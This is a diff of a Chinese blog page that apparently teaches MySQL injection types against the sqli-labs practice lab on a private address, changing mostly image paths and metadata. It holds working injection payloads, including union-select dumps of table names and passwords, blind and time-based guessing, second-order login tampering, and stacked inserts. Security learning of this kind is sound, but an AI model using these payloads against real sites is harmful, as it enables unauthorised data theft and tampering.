@@ -28,7 +28,6 @@
 <meta property="og:site_name" content="Ljierui Blog">
 <meta property="og:description" content="1、SQL注入原理当服务器把用户输入的字符串当作SQL语句去执行时，就会产生注入。  2、注入的类型常见的注入分为7类:    联合注入   盲注   报错注入   延时注入 二次注入 堆叠注入 宽字节注入">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png">
 <meta property="og:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png">
 <meta property="og:image" content="http://example.com/images/sql/3.png">
 <meta property="og:image" content="http://example.com/images/sql/4.png">
@@ -55,12 +54,12 @@
 <meta property="og:image" content="http://example.com/images/sql/26.png">
 <meta property="og:image" content="http://example.com/images/sql/27.png">
 <meta property="article:published_time" content="2021-06-27T08:22:50.000Z">
-<meta property="article:modified_time" content="2021-06-27T13:42:22.880Z">
+<meta property="article:modified_time" content="2021-06-27T13:56:02.502Z">
 <meta property="article:author" content="Ljierui">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png">
+<meta name="twitter:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png">
 
 <link rel="canonical" href="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
 
@@ -221,7 +220,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-06-27 16:22:50 / 修改时间：21:42:22" itemprop="dateCreated datePublished" datetime="2021-06-27T16:22:50+08:00">2021-06-27</time>
+              <time title="创建时间：2021-06-27 16:22:50 / 修改时间：21:56:02" itemprop="dateCreated datePublished" datetime="2021-06-27T16:22:50+08:00">2021-06-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -246,14 +245,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>8.2k</span>
+              <span>8.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
+              <span>8 分钟</span>
             </span>
 
         </div>
@@ -286,23 +285,12 @@
 <pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>；</span><br></pre></td></tr></table></figure>
 </code></pre>
 <p>由图一可以看到页面报错了，由与加入了单引号’ ，SQL解析了这个单引号，但发现没有第二个单引号来与它闭合，所有就会抛出这个错误。  </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：  	</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png" alt="图一"></p>
-<p>然后使用 and 1=1 , 1=2 判断注入点，查看页面回显是否正常。<br>注意要·使用注释符把后面的语句给注释掉，如果不注释掉后面的语句，则我们无法知道我们输入SQL语句是否正常执行。   </p>
-<pre><code>常见的注释符号：  
---   
---+   
-#   
-%23   
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">	语句：  	</span><br><span class="line">	http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;../img/1.png&quot; widith=&quot;50%&quot; /&gt;图三</span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后使用 and 1=1 , 1=2 判断注入点，查看页面回显是否正常。  </span></span><br><span class="line"><span class="string">注意要·使用注释符把后面的语句给注释掉，如果不注释掉后面的语句，则我们无法知道我们输入SQL语句是否正常执行。   </span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	常见的注释符号：  </span></span><br><span class="line"><span class="string">	--   </span></span><br><span class="line"><span class="string">	--+   </span></span><br><span class="line"><span class="string">	#   </span></span><br><span class="line"><span class="string">	%23   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	```sql</span></span><br><span class="line"><span class="string">	语句：</span></span><br><span class="line"><span class="string">	http://192.168.199.129:86/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+  </span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+  </span></span><br></pre></td></tr></table></figure>
-</code></pre>
-<img src="/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png" widith="50%">
-
-
+<p><img src="/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png" alt="图一"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http://192.168.199.129:86/Less-1/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/3.png" widith="50%">图三
+<img src="/./images/sql/3.png" widith="50%">图三
 </center>  
 
 
@@ -314,12 +302,12 @@
 <p>所以我们想要构建联合查询的表我们就需要先判断当前表有多少列，就要使用 order by 来判断当前表有多少列。<br>一般使用二分法来快速的判断，例如：order by 100(报错),则下一个使用 order by 50 来判断。<br>由下图可以得出，当 order by 3 时，页面正常，order by 4时，则页面报错。可以得出当前表中的列数是3。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>
 <center>页面正常 
-<img src="./images/sql/4.png" widith="50%">
+<img src="/./images/sql/4.png" widith="50%">
 </center>  
     
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>
 <center>页面错误 
-<img src="./images/sql/4.png" widith="50%">
+<img src="/./images/sql/4.png" widith="50%">
 </center>  
 
 
@@ -328,14 +316,14 @@
 <pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
 </code></pre>
 <center>
-<img src="./images/sql/6.png" widith="50%">
+<img src="/./images/sql/6.png" widith="50%">
 </center>
 
 <h4 id="3、查看当前数据库"><a href="#3、查看当前数据库" class="headerlink" title="3、查看当前数据库"></a>3、查看当前数据库</h4><p>使用 database()和version()函数分别输出当前的数据库名和版本<br>注：<br>1、 information_schema是系统的自带库，所有的数据库的信息都存放在里面。</p>
 <p>2、group_concat 表示一次性查出的东西 ，也可以使用 limit 排序查出。  </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：    </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),version() --+</span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/7.png" widith="50%">
+<img src="/./images/sql/7.png" widith="50%">
 </center>
 
  
@@ -343,17 +331,17 @@
 
 <h4 id="4、查看当前数据库下的所有的表"><a href="#4、查看当前数据库下的所有的表" class="headerlink" title="4、查看当前数据库下的所有的表"></a>4、查看当前数据库下的所有的表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() --+ </span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/8.png" widith="50%">
+<img src="/./images/sql/8.png" widith="50%">
 </center>
 
 <h4 id="5、查看表中存在的字段名"><a href="#5、查看表中存在的字段名" class="headerlink" title="5、查看表中存在的字段名"></a>5、查看表中存在的字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:   </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27;--+  </span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/10.png" widith="50%">
+<img src="/./images/sql/10.png" widith="50%">
 </center>
 
 <h4 id="6、查看特定字段中的数据"><a href="#6、查看特定字段中的数据" class="headerlink" title="6、查看特定字段中的数据"></a>6、查看特定字段中的数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(password) from security.users--+</span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/11.png" widith="50%">
+<img src="/./images/sql/11.png" widith="50%">
 </center>
 
 <h3 id="三-、盲注"><a href="#三-、盲注" class="headerlink" title="(三)、盲注"></a>(三)、盲注</h3><pre><code>什么是盲注?
@@ -384,30 +372,30 @@ http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页�
 这里判断是大于7却不等于7，那长度就是8了·
 </code></pre>
 <center>
-<img src="./images/sql/12.png" widith="50%">
+<img src="/./images/sql/12.png" widith="50%">
 </center>
 
 <h4 id="3、猜测数据库名"><a href="#3、猜测数据库名" class="headerlink" title="3、猜测数据库名"></a>3、猜测数据库名</h4><p>使用left()函数猜数据库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注：一般取中间来猜</span><br><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(database(),1) =&#x27;</span>s<span class="string">&#x27; --+ 页面正常 </span></span><br><span class="line"><span class="string">数据库名的第一个字母为s，因为数据库名是:security</span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/13.png" widith="50%">
+<img src="/./images/sql/13.png" widith="50%">
 </center>
 
 <h4 id="4、猜测表"><a href="#4、猜测表" class="headerlink" title="4、猜测表"></a>4、猜测表</h4><p>使用ascii()函数来把猜测的字母转成ascii</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ascii (substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span><span class="number">101</span> <span class="comment">--+  </span></span><br><span class="line"></span><br><span class="line">ascii码 <span class="number">101</span> 对应的是字母 e</span><br><span class="line"></span><br><span class="line">猜解第二个字母：</span><br><span class="line"><span class="keyword">and</span> ORD (mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span><span class="number">109</span> <span class="comment">--+（这里是m）</span></span><br><span class="line"></span><br><span class="line">说明： 这里将第一张表的第一个字母的ascii码解出来 、当要查第二个表的时候只要排序即可（limit <span class="number">1</span>,<span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">注意 ： ascii 可以使用ORD代替、substr可使用substring、mid代替</span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/14.png" widith="50%">
+<img src="/./images/sql/14.png" widith="50%">
 </center>
 
 <h4 id="5、猜测列名"><a href="#5、猜测列名" class="headerlink" title="5、猜测列名"></a>5、猜测列名</h4><p>使用regexp()猜测表下的列名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> column_name regexp <span class="string">&#x27;^u[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">注：<span class="number">1</span>表示只是为了提高运行的效率查到多少就返回多少</span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/15.png" widith="50%">
+<img src="/./images/sql/15.png" widith="50%">
 </center>
 
 <h4 id="6、获取列中的数据"><a href="#6、获取列中的数据" class="headerlink" title="6、获取列中的数据"></a>6、获取列中的数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ORD(MID((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">20</span>IFNULL(<span class="built_in">CAST</span>(username <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <center>
-<img src="./images/sql/16.png" widith="50%">
+<img src="/./images/sql/16.png" widith="50%">
 </center>
 
 
@@ -436,59 +424,59 @@ http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页�
 </code></pre>
 <h3 id="五-、延时注入"><a href="#五-、延时注入" class="headerlink" title="(五)、延时注入"></a>(五)、延时注入</h3><p>延时注入的原理和盲注差不多。<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#语句</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1)) =116,1,sleep(10))--+</span></span><br><span class="line"><span class="string">and if(ascii(语句)) =116,正常的返回值,不正常返回值)</span></span><br><span class="line"><span class="string">如果数据库名的第一字母的ascii等于166则返回1，否则延时10秒</span></span><br><span class="line"><span class="string">and if(ascii(substr(database(),1,1)) =116,sleep(10),1)</span></span><br><span class="line"><span class="string">这样写的话就是如果ascii等于166，则页面延时10秒，否则返回1</span></span><br></pre></td></tr></table></figure></p>
 <center>
-<img src="./images/sql/17.png" widith="50%">
+<img src="/./images/sql/17.png" widith="50%">
 </center>
 
 <h3 id="六-、二次注入"><a href="#六-、二次注入" class="headerlink" title="(六)、二次注入"></a>(六)、二次注入</h3><p>二次注入产生的原理：当我们第一次存储数据进数据库时，执行的sql语句会经过一层校验，把敏感的字符给转义了。但是当数据存储进数据库时。它把数据还原为转义前的数据。当某个地方要取出数据时，取出去的数据就是这些恶意的语句，这次就会产生二次注入。</p>
 <h4 id="1、靶场测试"><a href="#1、靶场测试" class="headerlink" title="1、靶场测试"></a>1、靶场测试</h4><p>这是当前数据库里存储的账号密码</p>
 <center>
-<img src="./images/sql/18.png" widith="50%">
+<img src="/./images/sql/18.png" widith="50%">
 </center>
 
 <p>这时去注册一个账号，注册账号为：admin’– -</p>
 <center>
-<img src="./images/sql/19.png" widith="50%">
+<img src="/./images/sql/19.png" widith="50%">
 </center>
 然后在去数据库查看存储的账号密码，可以看到输入的账号已经给存入数据库了，使用这个账号密码就可以登陆
 
 <center>
-<img src="./images/sql/20.png" widith="50%">
+<img src="/./images/sql/20.png" widith="50%">
 </center>
 
 <p>下一步我们就去修改账号密码</p>
 <center>
-<img src="./images/sql/21.png" widith="50%">
+<img src="/./images/sql/21.png" widith="50%">
 </center>
 
 <p>然后我们去查看数据库里的数据，这时发现账号:admin’ – 这个账号的密码没变，但是账号：admin的密码却从原来的admin变成了12345<br>原理是：密码修改页面，它仅对特殊字符进行了转义，判断输入两次密码是否一致，然后将用户键入，将数据插入至数据库。就是因为它相信了数据库存的数据是正常，直接把数据拿来用了。就会产生这种注入。</p>
 <center>
-<img src="./images/sql/22.png" widith="50%">
+<img src="/./images/sql/22.png" widith="50%">
 </center>
 
 <h3 id="七-、堆叠注入"><a href="#七-、堆叠注入" class="headerlink" title="(七)、堆叠注入"></a>(七)、堆叠注入</h3><p>原理：就是将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候我们使用增删查改毫无限制。<br>使用条件：<br>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，<br>利用mysqli_multi_query()函数就支持多条sql语句同时执行，<br>但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，<br>其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
 <h4 id="1、靶场练习"><a href="#1、靶场练习" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>用分号结束前面的语句，在后面插入我们的语句，这里我们向user表里添加一条新的用户数据<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; insert into users(id,username,password) value (123,&#x27;</span>aka<span class="string">&#x27;,&#x27;</span>aka<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure></p>
 <center>
-<img src="./images/sql/23.png" widith="50%">
+<img src="/./images/sql/23.png" widith="50%">
 </center>
 可以看到已经添加成功
 <center>
-<img src="./images/sql/24.png" widith="50%">
+<img src="/./images/sql/24.png" widith="50%">
 </center>
 
 <h3 id="八-、宽字节注入"><a href="#八-、宽字节注入" class="headerlink" title="(八)、宽字节注入"></a>(八)、宽字节注入</h3><p>原理：当对特殊字符使用反斜杠“\”来处理特殊字符时，而数据库编码又为GBK,这时可能存在宽字节注入</p>
 <h4 id="1、靶场练习-1"><a href="#1、靶场练习-1" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>先添加一个单引号，发现边成了1&#39;了。</p>
 <center>
-<img src="./images/sql/25.png" widith="50%">
+<img src="/./images/sql/25.png" widith="50%">
 </center>
 
 <p>这时候在单引号前加上%df，因为反斜杠的url编码为 %5c，而%df%5c在GBK编码里会变成一个中文字符。这时就会达到一个绕过的效果。</p>
 <center>
-<img src="./images/sql/26.png" widith="50%">
+<img src="/./images/sql/26.png" widith="50%">
 </center>
 
 <p>查看当前的数据库，可以判断我们输入的语句是成功执行的</p>
 <center>
-<img src="./images/sql/27.png" widith="50%">
+<img src="/./images/sql/27.png" widith="50%">
 </center>  
 <br>  
 <br>  
@@ -662,7 +650,7 @@ http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页�
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">7 分钟</span>
+    <span title="站点阅读时长">8 分钟</span>
 </div>
   <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9waXNjZXMudGhlbWUtbmV4dC5vcmc=">NexT.Pisces</span> 强力驱动
   </div>
